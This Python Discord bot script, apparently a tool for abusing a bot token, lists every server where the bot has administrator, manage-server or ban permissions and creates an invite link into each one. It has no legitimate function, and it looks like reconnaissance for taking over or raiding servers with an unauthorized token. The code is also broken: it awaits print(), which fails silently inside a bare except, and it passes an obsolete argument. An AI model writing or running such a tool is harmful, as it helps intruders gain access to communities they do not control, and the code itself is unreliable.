import discord
from discord.ext import commands

bot = commands.Bot(command_prefix ="!", case_insensitive=True, intents=discord.Intents.default(), help_command=None)

token = ""


@bot.event
async def on_ready():
    print(f"OMEGA Bot is connected!\nLogged in as: {bot.user.name}#{bot.user.discriminator}\nPREFIX: !")
    print(f"Guilds: {len(bot.guilds)}")
    admins = []
    bots = []
    bans = []

    for guild in bot.guilds:
        if guild.me.guild_permissions.administrator:
            admins.append(guild.id)
        if (guild.me.guild_permissions.manage_guild) and (not guild.me.guild_permissions.administrator):
            bots.append(guild.id)
        if (guild.me.guild_permissions.ban_members) and (not guild.me.guild_permissions.administrator):
            bans.append(guild.id)

    for id in admins:
        guild = bot.get_guild(int(id))
        for channel in guild.channels:
            try:
                invite = await channel.create_invite()
                await print(f"{invite}")
                break
            except:
                continue

    for id in bots:
        guild = bot.get_guild(int(id))
        for channel in guild.channels:
            try:
                invite = await channel.create_invite()
                await print(f"{invite}")
                break
            except:
                continue

    for id in bans:
        guild = bot.get_guild(int(id))
        for channel in guild.channels:
            try:
                invite = await channel.create_invite()
                await print(f"{invite}")
                break
            except:
                continue

bot.run(token, bot=True)
